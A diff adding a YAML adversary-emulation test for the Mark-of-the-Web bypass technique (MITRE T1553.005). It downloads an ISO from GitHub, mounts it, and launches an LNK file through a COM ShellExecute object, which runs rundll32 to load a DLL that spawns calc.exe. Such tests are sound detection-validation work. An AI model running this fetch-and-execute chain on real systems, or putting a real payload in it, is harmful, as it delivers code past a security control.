@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: Execute LNK file from ISO
+description: |
+    Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.
+args:
+    - name: path_of_iso
+      type: path
+      default: PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso
+uuid: c2587b8d-743d-4985-aa50-c83394eaeb68
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1553: Subvert Trust Controls'
+    subtechniques:
+        - 'T1553.005: Mark-of-the-Web Bypass'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        AllTheThings.iso must exist on disk at specified location (#{path_of_iso})
+      inline: |
+        if (Test-Path "#{path_of_iso}") {exit 0} else {{New-Item -Type Directory (split-path "#{path_of_iso}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile "#{path_of_iso}"
+        }}
+      executor: powershell
+    - name: execute-lnk-file-from-iso
+      inline: |
+        Mount-DiskImage -ImagePath "{{.Args.path_of_iso}}" -StorageType ISO -Access ReadOnly
+        $keep = Get-Volume -FileSystemLabel "AllTheThings"
+        $driveLetter = ($keep | Get-Volume).DriveLetter
+        $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"))
+        $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
+      executor: powershell
+      cleanup:
+        inline: |
+            Dismount-DiskImage -ImagePath "{{.Args.path_of_iso}}" | Out-Null
+        executor: powershell
